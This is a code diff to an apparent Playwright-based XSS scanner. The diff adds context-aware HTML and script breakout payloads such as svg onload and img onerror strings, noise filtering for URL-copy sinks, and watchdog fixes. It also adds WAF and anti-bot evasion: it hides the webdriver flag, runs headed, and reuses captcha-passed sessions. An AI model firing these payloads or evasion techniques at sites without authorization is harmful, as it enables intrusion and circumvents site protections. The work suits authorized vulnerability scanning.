@@ -1,5 +1,5 @@
 from playwright.sync_api import sync_playwright, TimeoutError as PlaywrightTimeoutError
-from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote
+from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote, unquote
 import os
 import re
 import signal
@@ -17,9 +17,23 @@ stage1_wait = 0
 
 import hashlib
 import time
+import logging
+
+# Playwright runs its protocol transport on an asyncio loop. When the watchdog
+# SIGKILLs a hung worker's Node driver, that worker's loop keeps flushing its
+# buffered writes to the now-dead pipe and asyncio logs a WARNING per write
+# ("pipe closed by peer or os.write(pipe, data) raised exception.") — ~45 lines
+# per kill. It's expected fallout of an intentional teardown, so drop just that
+# message to keep the real log readable (other asyncio warnings still show).
+class _DropPipeClosedWarning(logging.Filter):
+    def filter(self, record):
+        return 'pipe closed by peer' not in record.getMessage()
+
+logging.getLogger('asyncio').addFilter(_DropPipeClosedWarning())
 
 WORKER_TIMEOUT = 60  # seconds
-BROWSER_REFRESH_INTERVAL = 20  # URLs per browser before recycle
+BROWSER_REFRESH_INTERVAL = 50   # URLs per browser before recycle
+DRIVER_REFRESH_INTERVAL = 100   # URLs per playwright Node.js driver before full restart
 worker_state = {}  # wid -> {'last': float, 'browser': Browser}
 worker_state_lock = threading.Lock()
 
@@ -37,6 +51,18 @@ output_file = None
 output_lock = threading.Lock()
 debug_mode = False
 dedup = False
+extra_headers = {}
+# Path to a Playwright storage_state JSON (cookies + localStorage) captured from
+# a real, WAF-passed session. When set, every context loads it and cookies are
+# NOT cleared between URLs (clearing would drop the anti-bot cookie).
+storage_state_path = None
+# Run browsers visibly (needs a display). Headed Chromium drops the
+# "HeadlessChrome" client-hint brand, which some WAFs block on — and it matches
+# the fingerprint of a session captured with --capture-session.
+headed = False
+# Fixed viewport {'width': W, 'height': H} from --viewport (e.g. mobile 430x932).
+# None keeps Playwright's default (1280x720).
+viewport = None
 
 
 def is_closed_error(e):
@@ -45,6 +71,24 @@ def is_closed_error(e):
             or 'Target closed' in msg
             or 'Browser closed' in msg
             or 'Connection closed' in msg)
+
+
+def pid_alive(pid):
+    """True if the process exists. Used by the watchdog to catch a dead Node
+    driver (OOM/crash/broken pipe) fast — a worker blocked on a dead driver
+    never raises (asyncio drops the writes silently), so without this it only
+    recovers on the 60s hang timeout."""
+    if not pid:
+        return False
+    try:
+        os.kill(pid, 0)
+        return True
+    except ProcessLookupError:
+        return False
+    except PermissionError:
+        return True
+    except Exception:
+        return True
 
 
 def kill_node_driver(pid):
@@ -72,6 +116,88 @@ def domain_record_error(domain):
     with domain_errors_lock:
         domain_errors[domain] = domain_errors.get(domain, 0) + 1
         return domain_errors[domain]
+
+
+# Sinks that only ever ride along with the page's own URL — the canary in
+# their value came from location, so no attacker-controlled source flowed in.
+# location_* are exempt on purpose (open-redirect leads), JS sinks and
+# script_text can't be a pure URL copy. (Literal set: JS_SINKS is defined
+# further down; keep the two in sync.)
+NOISE_EXEMPT_SINKS = {'eval', 'func', 'setTimeout', 'setInterval', 'script_text',
+                      'location_nav', 'location_assign', 'location_replace',
+                      'location_href'}
+
+
+def filter_noise_sinks(sinks, current_url='', dom_url=None):
+    """Drop URL-copy sinks: share widgets, trackers, captcha/embed href
+    params — values that embed the page's own URL. Signal: there the canary
+    sits MID-URL, immediately followed by query/fragment continuation
+    (`&`, `#`, or their percent-encoded forms), because the page glued its
+    full location into a bigger URL. Genuine flows have the canary
+    free-standing or at a value end (breakout-capable), so they survive.
+    For pure URL-attribute sinks (a_href, *_src, ...) a value-end canary is
+    also noise — no markup to break out of — UNLESS the canary starts the
+    whole value (full-value control => javascript: URL possible => keep).
+    Analysis runs on once-unquoted code so single- and double-encoded
+    embeds normalize to the same shape."""
+    if not sinks:
+        return list(sinks)
+    canary = config['canary']
+    rgx = re.compile(canary + r'[a-zA-Z0-9_.\[\]\-]+')
+    kept = []
+    for s in sinks:
+        if s.get('sink') in NOISE_EXEMPT_SINKS:
+            kept.append(s)
+            continue
+        decoded = unquote(s.get('code') or '')
+        url_attr = s['sink'] in {'a_href', 'image_src', 'script_src',
+                                 'iframe_src', 'form_action'}
+        if s['sink'].startswith('setAttribute_'):
+            attr = s['sink'].split('_', 2)[2] if s['sink'].count('_') >= 2 else ''
+            url_attr = attr in ('href', 'src', 'action', 'formaction', 'content')
+        if url_attr and decoded.lstrip().lstrip('<').startswith(canary):
+            kept.append(s)  # full-value control — javascript: URL candidate
+            continue
+        occ = []
+        for m in rgx.finditer(decoded):
+            before = decoded[:m.start()]
+            tail = decoded[m.end():]
+            # skip the wrapped canary's closing `>` (raw or %3E)
+            if tail.startswith('>'):
+                tail = tail[1:]
+            elif tail[:3].lower() == '%3e':
+                tail = tail[3:]
+            if url_attr:
+                # for URL-attribute sinks only query position can be noise:
+                # canary in path/authority/fragment of the resolved value
+                # means the page assigned (nearly) the whole value —
+                # attacker-controlled, e.g. `a.href = <rivalsssinput>`
+                # resolving to a path. `?` must be the last URL separator
+                # before the canary for it to sit inside the query.
+                q, h = before.rfind('?'), before.rfind('#')
+                if q == -1 or (h != -1 and h > q):
+                    occ.append('free')
+                    continue
+            # mid: more query params follow (`&x=` or encoded forms). A bare
+            # `&` without `name=` (HTML entities like `&nbsp;`) is NOT
+            # continuation — that's markup after a free-standing value.
+            if (re.match(r'&[A-Za-z0-9_.%\-]+(?:=|%3D)', tail, re.I)
+                    or tail[:3].lower() in ('%26', '%23')
+                    or tail.startswith('#')):
+                occ.append('mid')
+            elif (tail.startswith(('"', "'", '>', '%22', '%27', '%3e', '%3E'))
+                    or tail == ''):
+                # value end: ambiguous for markup sinks (breakout-capable),
+                # plain noise for url-attr sinks (nothing to break out of)
+                occ.append('mid' if url_attr else 'end')
+            else:
+                occ.append('free')
+        # noise only when every occurrence rides inside an embedded URL
+        # (mid-param or its tail end) and none is free-standing markup
+        if 'mid' in occ and 'free' not in occ:
+            continue
+        kept.append(s)
+    return kept
 
 
 def filter_new_sinks(domain, sinks, current_url=''):
@@ -169,10 +295,11 @@ def find_reflected_canaries(raw_html, canary):
 
 
 def get_reflected_payloads(reflected, canary):
-    """Generate confirmation payloads for server-side reflected canaries.
-    One universal HTML-breakout payload per unique key — the tag-eating prefix
-    handles script/style/title/textarea/attribute contexts, so we don't need
-    to branch on the detected context for confirmation."""
+    """Generate confirmation payloads for server-side reflected canaries."""
+    # Dedup by (key, ctx_group) so each key gets at most one html/attr payload
+    # AND one script payload. The two classes need different payloads: script
+    # contexts JSON-escape " to \" (breaking onload="..."), while html/attr
+    # contexts do not.
     seen = set()
     results = []
     for r in reflected:
@@ -180,11 +307,19 @@ def get_reflected_payloads(reflected, canary):
         if isinstance(keys, str):
             keys = [keys]
         ctx = r.get('context', 'html')
+        ctx_group = 'script' if ctx == 'script' else 'other'
         for key in keys:
-            if not key or key in seen:
+            dedup_key = (key, ctx_group)
+            if not key or dedup_key in seen:
                 continue
-            seen.add(key)
-            payload = f"'\"></stYle/</titLe/</teXtarEa/</scRipt/--!><svg/onload=\"rsjsstorage.alertfunc('{key}')\">"
+            seen.add(dedup_key)
+            if ctx == 'script':
+                # " gets JSON-escaped to \" inside <script> JSON blobs, making
+                # onload="..." a JS syntax error. Use single-quoted attribute +
+                # this.id so no " appears in the event handler.
+                payload = f"'\"></stYle/</titLe/</teXtarEa/</scRipt/--!><svg id={key} onload=rsjsstorage.alertfunc(this.id)>"
+            else:
+                payload = f"'\"></stYle/</titLe/</teXtarEa/</scRipt/--!><svg/onload=\"rsjsstorage.alertfunc('{key}')\">"
             results.append({'key': key, 'sink': 'reflected_' + ctx, 'ctx': 'html', 'payload': payload})
     return results
 
@@ -239,6 +374,41 @@ def detect_js_context(code, canary, key):
         if count % 2 == 1:
             return name
     return 'expr'
+
+
+def detect_html_context(code, canary, key):
+    """Determine the attribute-value quoting context of canary+key in HTML code.
+    The HTML5 parser's 'before attribute value state' treats the first character
+    after `=` as the delimiter: `"` → double-quoted, `'` → single-quoted,
+    anything else → unquoted.  The universal payload `'">…` starts with `'`,
+    which *opens* a single-quoted value in the unquoted case and swallows the
+    entire attack.  Returns the right context so get_payloads can pick a
+    matching breakout.
+    Returns: 'unquoted' | 'single' | 'double' | 'text'
+    """
+    marker = canary + key
+    idx = code.find(marker)
+    if idx == -1:
+        return 'text'
+    start = idx
+    # rsCanaryValue wraps values in <canary+key> — skip the opening `<`
+    if start > 0 and code[start - 1] == '<':
+        start -= 1
+    j = start - 1
+    while j >= 0 and code[j] in ' \t\n\r':
+        j -= 1
+    if j < 0:
+        return 'text'
+    if code[j] == '=':
+        return 'unquoted'
+    if code[j] in ('"', "'"):
+        q = code[j]
+        k = j - 1
+        while k >= 0 and code[k] in ' \t\n\r':
+            k -= 1
+        if k >= 0 and code[k] == '=':
+            return 'double' if q == '"' else 'single'
+    return 'text'
 
 
 def is_url_exploitable(code, canary, key):
@@ -305,8 +475,27 @@ def get_payloads(sink, canary):
                             'payload': f"javascript:rsjsstorage.alertfunc('{key}')"})
 
         elif stype in HTML_SINKS:
-            results.append({'key': key, 'sink': stype, 'ctx': 'html',
-                            'payload': f"'\"></stYle/</titLe/</teXtarEa/</scRipt/--!><img/src/onerror=\"rsjsstorage.alertfunc('{key}')\">"})
+            # createElement single-tag shape: code is exactly `<canary+key>`,
+            # meaning a jQuery-style $(value) call hit the HTML branch of its
+            # HTML-vs-selector heuristic on the wrapped canary (preload.js
+            # wraps canaries in <…> on purpose). The confirmation payload must
+            # ALSO start with '<' or the heuristic routes it to the selector
+            # path at confirm time and nothing executes. No breakout prefix:
+            # the canary was the whole fragment, not text inside markup.
+            if code == f"<{canary}{key}>":
+                results.append({'key': key, 'sink': stype, 'ctx': 'html',
+                                'payload': f"<img/src/onerror=rsjsstorage.alertfunc('{key}')>"})
+            else:
+                html_ctx = detect_html_context(code, canary, key)
+                if html_ctx == 'unquoted':
+                    payload = f"></stYle/</titLe/</teXtarEa/</scRipt/--!><img src=x onerror=\"rsjsstorage.alertfunc('{key}')\">"
+                elif html_ctx == 'single':
+                    payload = f"'></stYle/</titLe/</teXtarEa/</scRipt/--!><img src=x onerror=\"rsjsstorage.alertfunc('{key}')\">"
+                elif html_ctx == 'double':
+                    payload = f"\"></stYle/</titLe/</teXtarEa/</scRipt/--!><img src=x onerror=\"rsjsstorage.alertfunc('{key}')\">"
+                else:
+                    payload = f"'\"></stYle/</titLe/</teXtarEa/</scRipt/--!><img/src/onerror=\"rsjsstorage.alertfunc('{key}')\">"
+                results.append({'key': key, 'sink': stype, 'ctx': 'html', 'payload': payload})
 
         elif stype.startswith('setAttribute_'):
             # format: setAttribute_<tag>_<attr>
@@ -363,9 +552,10 @@ def emit_confirmed(base_url, confirmed):
                 output_file.write(line + '\n')
 
 
-def process_url_stage2(context, url, payloads):
+def process_url_stage2(context, url, payloads, heartbeat=None):
     """Stage 2: reload the same URL with canary params, but preload_inject.js
     returns payload values via USP hooks and hash."""
+    beat = heartbeat or (lambda: None)
     if not payloads:
         return []
     inject_script = build_inject_js(payloads)
@@ -394,14 +584,20 @@ def process_url_stage2(context, url, payloads):
             page.goto(target_url, timeout=10000, wait_until='commit')
         except PlaywrightTimeoutError:
             pass
+        beat()
         expected = len(payloads)
         try:
             page.wait_for_function(
                 f"() => window.rsjsstorage && window.rsjsstorage.jsEvals.length >= {expected}",
-                timeout=1500,
+                # Heavy SPAs hydrate long after `commit`; the sink path (and the
+                # alertfunc call) often fires seconds later. 1.5s systematically
+                # under-confirmed; 5s covers hydration + late timers without
+                # dominating scan time (stage 2 only runs on pages with sinks).
+                timeout=5000,
             )
         except PlaywrightTimeoutError:
             pass
+        beat()
         js_evals = page.evaluate("() => window.rsjsstorage ? window.rsjsstorage.jsEvals : null")
         confirmed = [p for p in payloads if p['key'] in (js_evals or [])]
         return confirmed
@@ -417,14 +613,16 @@ def process_url_stage2(context, url, payloads):
             pass
 
 
-def process_url_stage2_reflected(context, base_url, payloads):
+def process_url_stage2_reflected(context, base_url, payloads, heartbeat=None):
     """Confirm server-side reflected XSS by navigating with the payload as the
     raw query value (no JS hooks — the server has to be doing the reflection
     for execution to fire). Returns payloads whose key landed in jsEvals."""
+    beat = heartbeat or (lambda: None)
     if not payloads:
         return []
     confirmed = []
     for p in payloads:
+        beat()
         target_url = build_payload_url(base_url, p['key'], p['payload'])
         try:
             page = context.new_page()
@@ -452,11 +650,14 @@ def process_url_stage2_reflected(context, base_url, payloads):
                 page.goto(target_url, timeout=10000, wait_until='commit')
             except PlaywrightTimeoutError:
                 pass
+            beat()
             try:
                 page.wait_for_function(
                     "(k) => window.rsjsstorage && window.rsjsstorage.jsEvals.includes(k)",
                     arg=p['key'],
-                    timeout=1500,
+                    # Same rationale as process_url_stage2: SPA hydration and
+                    # late timers need more than the previous 1.5s window.
+                    timeout=5000,
                 )
             except PlaywrightTimeoutError:
                 pass
@@ -490,7 +691,8 @@ def inject_canary_params(url, canary):
 BLOCKED_RESOURCE_TYPES = {'image', 'media', 'font'}
 
 
-def process_url(context, url):
+def process_url(context, url, heartbeat=None):
+        beat = heartbeat or (lambda: None)
         url_domain = urlparse(url).netloc
         if domain_is_blocked(url_domain):
             return
@@ -505,11 +707,15 @@ def process_url(context, url):
         try:
             url = inject_canary_params(url, config['canary'])
             raw_body = []
+            main_status = [None]
             target_url = url + f"#{config['canary']}_hash"
 
             def capture_response(response):
-                # capture the main document response body
-                if response.url.split('#')[0] == url and 'text/html' in (response.headers.get('content-type', '')):
+                # capture the main document response body. XHTML documents
+                # (application/xhtml+xml) are HTML for reflection purposes too.
+                ct = response.headers.get('content-type', '')
+                if response.url.split('#')[0] == url and ('text/html' in ct or 'application/xhtml+xml' in ct):
+                    main_status[0] = response.status
                     try:
                         raw_body.append(response.text())
                     except Exception:
@@ -557,6 +763,7 @@ def process_url(context, url):
                 page.goto(target_url, timeout=10000, wait_until='commit')
             except PlaywrightTimeoutError:
                 pass
+            beat()
             # Post-commit settle: 'load' and 'domcontentloaded' never fire on
             # pages where the IIFE triggers a canary nav that we 204; waiting
             # on them costs the full timeout. networkidle is safer because the
@@ -569,6 +776,7 @@ def process_url(context, url):
                     pass
             else:
                 page.wait_for_timeout(300)
+            beat()
             rsjsstorage = page.evaluate("""() => {
                 return window.rsjsstorage
             }""")
@@ -590,6 +798,11 @@ def process_url(context, url):
                     rsjsstorage['reflected'] = new_reflected
 
             merged_sinks = (rsjsstorage.get('sinks') or []) + nav_sinks
+            noise_before = len(merged_sinks)
+            merged_sinks = filter_noise_sinks(merged_sinks, current_url, rsjsstorage.get('dom_url'))
+            if debug_mode and len(merged_sinks) < noise_before:
+                print(f"[noise] {url_domain}: dropped {noise_before - len(merged_sinks)} "
+                      f"url-copy sink(s) on {current_url}", file=sys.stderr)
             new_sinks = filter_new_sinks(domain, merged_sinks, current_url)
 
             # Stage 2: generate payloads and verify execution
@@ -599,7 +812,7 @@ def process_url(context, url):
             confirmed = []
             if payloads:
                 static_confirmed = static_confirm_url_sinks(new_sinks, payloads, config['canary'])
-                stage2_confirmed = process_url_stage2(context, url, payloads)
+                stage2_confirmed = process_url_stage2(context, url, payloads, heartbeat=beat)
                 seen = set()
                 for p in static_confirmed + stage2_confirmed:
                     k = (p['key'], p['sink'])
@@ -616,14 +829,23 @@ def process_url(context, url):
                 reflected_payloads = [p for p in reflected_payloads
                                       if not any(p['key'] == k[0] for k in confirmed_keys)]
                 if reflected_payloads:
-                    for p in process_url_stage2_reflected(context, url, reflected_payloads):
+                    for p in process_url_stage2_reflected(context, url, reflected_payloads, heartbeat=beat):
                         confirmed.append(p)
 
             if confirmed:
                 emit_confirmed(rsjsstorage['dom_url'], confirmed)
 
-            if debug_mode and (new_sinks or rsjsstorage.get('reflected')):
-                print({'originurl': rsjsstorage.get('originurl'), 'dom_url': rsjsstorage.get('dom_url'), 'uspRevealed': rsjsstorage.get('uspRevealed'), 'sinks': new_sinks, 'confirmed': confirmed, 'reflected': rsjsstorage.get('reflected')}, file=sys.stderr)
+            # Surface WAF/error pages: a blocked doc has no sinks and reflects
+            # nothing, so it's otherwise indistinguishable from a clean page.
+            if main_status[0] and main_status[0] >= 400:
+                print(f"[{url_domain}] main document {main_status[0]} for {url} "
+                      f"(likely blocked/rate-limited — no findings possible)", file=sys.stderr)
+            if debug_mode:
+                if new_sinks or rsjsstorage.get('reflected'):
+                    print({'originurl': rsjsstorage.get('originurl'), 'dom_url': rsjsstorage.get('dom_url'), 'uspRevealed': rsjsstorage.get('uspRevealed'), 'sinks': new_sinks, 'confirmed': confirmed, 'reflected': rsjsstorage.get('reflected')}, file=sys.stderr)
+                else:
+                    print(f"[no findings] {current_url} status={main_status[0]} "
+                          f"(rsjsstorage ok, 0 sinks / 0 reflected)", file=sys.stderr)
 
         except Exception as r:
             if is_closed_error(r):
@@ -640,83 +862,124 @@ def process_url(context, url):
 def worker(wid, queue: Queue, done_event: threading.Event):
     with worker_state_lock:
         worker_state.setdefault(wid, {'last': time.time(), 'node_pid': None})
+
+    def heartbeat():
+        # Called by process_url at each I/O milestone so the watchdog's
+        # WORKER_TIMEOUT measures time-since-last-progress (a real hang), not
+        # total URL processing time (which legitimately exceeds it on slow
+        # pages with -w and multi-page stage-2 confirmation).
+        with worker_state_lock:
+            if wid in worker_state:
+                worker_state[wid]['last'] = time.time()
+
     try:
-        with sync_playwright() as p:
-            try:
-                node_pid = p._impl_obj._connection._transport._proc.pid
-            except Exception:
-                node_pid = None
-
-            def launch_browser():
-                browser = p.chromium.launch(args=[
-                    '--js-flags=--max-old-space-size=500',
-                    # '--disable-dev-shm-usage',
-                    # '--disable-features=site-per-process,IsolateOrigins',
-                    # '--disable-gpu',
-                    # '--disable-software-rasterizer',
-                    # '--disable-accelerated-2d-canvas',
-                    # '--in-process-gpu',
-                ])
-                context = browser.new_context(
-                    bypass_csp=True,
-                    user_agent=config['ua'],
-                    ignore_https_errors=True,
-                )
-                context.add_init_script(script=preloadjs)
-                return browser, context
-
-            browser, context = launch_browser()
-            with worker_state_lock:
-                worker_state[wid] = {'last': time.time(), 'node_pid': node_pid}
-            processed = 0
-            while True:
+        while True:  # outer: restart the playwright Node.js driver periodically
+            restart_driver = False
+            with sync_playwright() as p:
                 try:
-                    url = queue.get(timeout=1)
+                    node_pid = p._impl_obj._connection._transport._proc.pid
                 except Exception:
-                    if done_event.is_set() and queue.empty():
-                        break
-                    continue
+                    node_pid = None
+
+                def launch_browser():
+                    browser = p.chromium.launch(headless=not headed, args=[
+                        # '--js-flags=--max-old-space-size=500',
+                        # Drop navigator.webdriver — a cheap, well-known bot tell that
+                        # some WAFs block on. (The HeadlessChrome client-hint brand is
+                        # a separate, harder signal; reuse a real session via --session
+                        # to get past WAFs that fingerprint deeper than this.)
+                        '--disable-blink-features=AutomationControlled',
+                        # '--disable-dev-shm-usage',
+                        # '--disable-features=site-per-process,IsolateOrigins',
+                        # '--disable-gpu',
+                        # '--disable-software-rasterizer',
+                        # '--disable-accelerated-2d-canvas',
+                        # '--in-process-gpu',
+                    ])
+                    context = browser.new_context(
+                        bypass_csp=True,
+                        user_agent=config['ua'],
+                        ignore_https_errors=True,
+                        extra_http_headers=extra_headers or None,
+                        storage_state=storage_state_path,
+                        **({'viewport': viewport} if viewport else {}),
+                    )
+                    context.add_init_script(script=preloadjs)
+                    return browser, context
+
+                browser, context = launch_browser()
                 with worker_state_lock:
-                    if wid in worker_state:
-                        worker_state[wid]['last'] = time.time()
-                        worker_state[wid]['url'] = url
-                try:
-                    process_url(context, url)
-                except Exception as e:
-                    if is_closed_error(e):
-                        print(f"[worker {wid}] browser/context closed on {url}, exiting for respawn", file=sys.stderr)
-                        break
-                    print(f"[worker {wid}] process_url: {e}", file=sys.stderr)
-                with worker_state_lock:
-                    if wid in worker_state:
-                        worker_state[wid]['url'] = None
-                processed += 1
-                if processed >= BROWSER_REFRESH_INTERVAL:
-                    print(f"[worker {wid}] recycling browser after {processed} URLs", file=sys.stderr)
+                    worker_state[wid] = {'last': time.time(), 'node_pid': node_pid}
+                processed = 0    # per-browser URL count
+                driver_urls = 0  # per-driver URL count
+                while True:
                     try:
-                        browser.close()
+                        url = queue.get(timeout=1)
                     except Exception:
-                        pass
-                    try:
-                        browser, context = launch_browser()
-                    except Exception as e:
-                        print(f"[worker {wid}] relaunch failed: {e}", file=sys.stderr)
-                        break
+                        if done_event.is_set() and queue.empty():
+                            break
+                        continue
                     with worker_state_lock:
                         if wid in worker_state:
                             worker_state[wid]['last'] = time.time()
-                    processed = 0
-                    continue
-                try:
-                    context.clear_cookies()
-                except Exception as e:
-                    if is_closed_error(e):
-                        print(f"[worker {wid}] context closed after {url}, exiting for respawn", file=sys.stderr)
+                            worker_state[wid]['url'] = url
+                    try:
+                        process_url(context, url, heartbeat=heartbeat)
+                    except Exception as e:
+                        if is_closed_error(e):
+                            print(f"[worker {wid}] driver/browser closed on {url}, restarting driver", file=sys.stderr)
+                            restart_driver = True
+                            break
+                        print(f"[worker {wid}] process_url: {e}", file=sys.stderr)
+                    with worker_state_lock:
+                        if wid in worker_state:
+                            worker_state[wid]['url'] = None
+                    processed += 1
+                    driver_urls += 1
+                    if driver_urls >= DRIVER_REFRESH_INTERVAL:
+                        print(f"[worker {wid}] recycling playwright driver after {driver_urls} URLs", file=sys.stderr)
+                        restart_driver = True
                         break
-            try:
-                browser.close()
-            except Exception:
-                pass
+                    if processed >= BROWSER_REFRESH_INTERVAL:
+                        # Recycle via a full driver restart (torn down by killing
+                        # the node process below). browser.close() blocks forever
+                        # on a wedged browser and never unwinds even when the
+                        # driver is SIGKILLed — it leaked one worker thread per
+                        # incident, which drove the slowdown-over-time spiral.
+                        print(f"[worker {wid}] recycling browser after {processed} URLs", file=sys.stderr)
+                        restart_driver = True
+                        break
+                    # No per-URL context.clear_cookies(): it has the same hang-and-
+                    # leak behavior as close() on a wedged browser and was the
+                    # second-biggest leak source. The recycle above resets all
+                    # state every BROWSER_REFRESH_INTERVAL URLs; minor cookie bleed
+                    # within that window is acceptable for a diverse-URL scanner.
+                    # (With --session we intentionally keep cookies anyway.)
+                if restart_driver:
+                    # Between drivers: null the tracked pid so the watchdog's
+                    # dead-driver check doesn't race the relaunch (the current
+                    # driver is about to be torn down). The 60s hang timeout
+                    # still guards this window.
+                    with worker_state_lock:
+                        if wid in worker_state:
+                            worker_state[wid]['node_pid'] = None
+                            worker_state[wid]['last'] = time.time()
+                            worker_state[wid]['url'] = None
+                # Tear down by killing the node process, NOT browser.close():
+                # close() blocks forever on a wedged (especially headed) browser
+                # and does not unwind even when the driver is later SIGKILLed,
+                # leaking one worker thread per incident. Killing node is instant
+                # and cascades to chromium via PR_SET_PDEATHSIG. No-op if node is
+                # already dead (is_closed_error path).
+                kill_node_driver(node_pid)
+            # exiting 'with sync_playwright()' stops the (now dead) driver
+            if not restart_driver:
+                break  # queue drained or launch failure — worker exits
+            # If the watchdog already evicted this wid, don't run as a ghost.
+            with worker_state_lock:
+                if wid not in worker_state:
+                    break
+            print(f"[worker {wid}] restarting playwright driver", file=sys.stderr)
     except Exception as e:
         print(f"[worker {wid}] died: {e}", file=sys.stderr)
     finally:
@@ -740,16 +1003,22 @@ def watchdog(queue, next_wid_holder, target_workers, stop_event, done_event):
         stuck = []
         with worker_state_lock:
             for wid, st in list(worker_state.items()):
-                if now - st['last'] > WORKER_TIMEOUT:
-                    stuck.append((wid, st.get('node_pid'), st.get('url')))
+                node_pid = st.get('node_pid')
+                # Dead driver: recover in ~5s instead of waiting the full 60s.
+                # node_pid is nulled while a worker is legitimately between
+                # drivers, so a None pid here is never treated as dead.
+                dead_driver = node_pid is not None and not pid_alive(node_pid)
+                if dead_driver or now - st['last'] > WORKER_TIMEOUT:
+                    stuck.append((wid, node_pid, st.get('url'), dead_driver))
                     worker_state.pop(wid, None)
-        for wid, node_pid, hung_url in stuck:
+        for wid, node_pid, hung_url, dead_driver in stuck:
+            reason = "driver died" if dead_driver else f"hung > {WORKER_TIMEOUT}s"
             if hung_url:
                 d = urlparse(hung_url).netloc
                 count = domain_record_error(d)
-                print(f"[watchdog] worker {wid} hung > {WORKER_TIMEOUT}s on {hung_url} [{d} err {count}/{DOMAIN_MAX_ERRORS}], killing driver pid {node_pid}", file=sys.stderr)
+                print(f"[watchdog] worker {wid} {reason} on {hung_url} [{d} err {count}/{DOMAIN_MAX_ERRORS}], killing driver pid {node_pid}", file=sys.stderr)
             else:
-                print(f"[watchdog] worker {wid} hung > {WORKER_TIMEOUT}s (idle), killing driver pid {node_pid}", file=sys.stderr)
+                print(f"[watchdog] worker {wid} {reason} (idle), killing driver pid {node_pid}", file=sys.stderr)
             kill_node_driver(node_pid)
             spawn_worker()
         # Top up workers that died on their own (e.g. browser crash, OOM, exception).
@@ -768,8 +1037,44 @@ def watchdog(queue, next_wid_holder, target_workers, stop_event, done_event):
                     return
 
 
+def capture_session(url, path, ua, viewport=None):
+    """Open a visible browser at `url`, let the human pass any WAF/captcha, then
+    save cookies + localStorage to `path` for reuse with --session. Needs a
+    display (DISPLAY / WSLg). Use the SAME --ua and --viewport here and on the
+    scan run — WAF anti-bot cookies are commonly bound to the User-Agent."""
+    with sync_playwright() as p:
+        browser = p.chromium.launch(
+            headless=False,
+            args=['--disable-blink-features=AutomationControlled'],
+        )
+        context = browser.new_context(
+            user_agent=ua,
+            ignore_https_errors=True,
+            **({'viewport': viewport} if viewport else {}),
+        )
+        page = context.new_page()
+        try:
+            page.goto(url, timeout=30000, wait_until='commit')
+        except Exception as e:
+            print(f"[capture] goto: {e}", file=sys.stderr)
+        print("\n[capture] A browser window is open. Solve any captcha / wait for the\n"
+              "          real page to load, then press Enter here to save the session.",
+              file=sys.stderr)
+        try:
+            input()
+        except EOFError:
+            # Non-interactive stdin (e.g. piped): give a fixed window instead.
+            page.wait_for_timeout(15000)
+        context.storage_state(path=path)
+        print(f"[capture] saved session ({len(context.cookies())} cookies) to {path}", file=sys.stderr)
+        try:
+            browser.close()
+        except Exception:
+            pass
+
+
 def main():
-    global preloadjs, injectjs, stage1_wait, output_file, debug_mode, dedup
+    global preloadjs, injectjs, stage1_wait, output_file, debug_mode, dedup, extra_headers, storage_state_path, headed, viewport
     preloadjs = getPreloadJS()
     injectjs = getInjectJS()
     with open("js/preload_debug.js", "w") as f:
@@ -782,10 +1087,44 @@ def main():
     parser.add_argument('-o','--output', help="File to write confirmed findings to (truncated on open)")
     parser.add_argument('-d','--debug', action='store_true', help="Print unconfirmed sinks and reflected hits to stdout")
     parser.add_argument('-D','--dedup', action='store_true', help="Enable per-domain sink/reflected deduplication")
+    parser.add_argument('-H','--header', action='append', default=[],
+                        help='Extra HTTP header "Name: Value" sent on every request (repeatable)')
+    parser.add_argument('--ua', help="Override the User-Agent from config.yaml (use the same value for capture and scan)")
+    parser.add_argument('--session', metavar='PATH',
+                        help="Load this storage_state JSON (cookies + localStorage) into every context and keep cookies across URLs — reuse a real, WAF-passed session")
+    parser.add_argument('--capture-session', metavar='URL',
+                        help="Headed capture: open URL, let you solve any WAF/captcha, then save the session to --session PATH and exit")
+    parser.add_argument('--headed', action='store_true',
+                        help="Run browsers visibly (needs a display) — drops the HeadlessChrome fingerprint; use with --session to match a captured session")
+    parser.add_argument('--viewport', metavar='WxH',
+                        help="Fixed viewport size, e.g. 430x932 for mobile (default 1280x720). Use the same value for capture and scan")
     args = parser.parse_args()
+    headed = args.headed
+    if args.viewport:
+        try:
+            w, h = (int(x) for x in args.viewport.lower().split('x', 1))
+            viewport = {'width': w, 'height': h}
+        except ValueError:
+            parser.error(f"--viewport expects WxH (e.g. 430x932), got: {args.viewport}")
     stage1_wait = args.wait
     debug_mode = args.debug
     dedup = args.dedup
+    if args.ua:
+        config['ua'] = args.ua
+    if args.capture_session:
+        if not args.session:
+            parser.error("--capture-session requires --session PATH to save the session to")
+        capture_session(args.capture_session, args.session, config['ua'], viewport)
+        return
+    if args.session:
+        storage_state_path = args.session
+        print(f"[session] reusing {storage_state_path} (cookies kept across URLs)", file=sys.stderr)
+    for h in args.header:
+        if ':' not in h:
+            print(f"[header] ignoring malformed (expected 'Name: Value'): {h}", file=sys.stderr)
+            continue
+        name, _, value = h.partition(':')
+        extra_headers[name.strip()] = value.strip()
     if args.output:
         output_file = open(args.output, 'w', buffering=1)
 
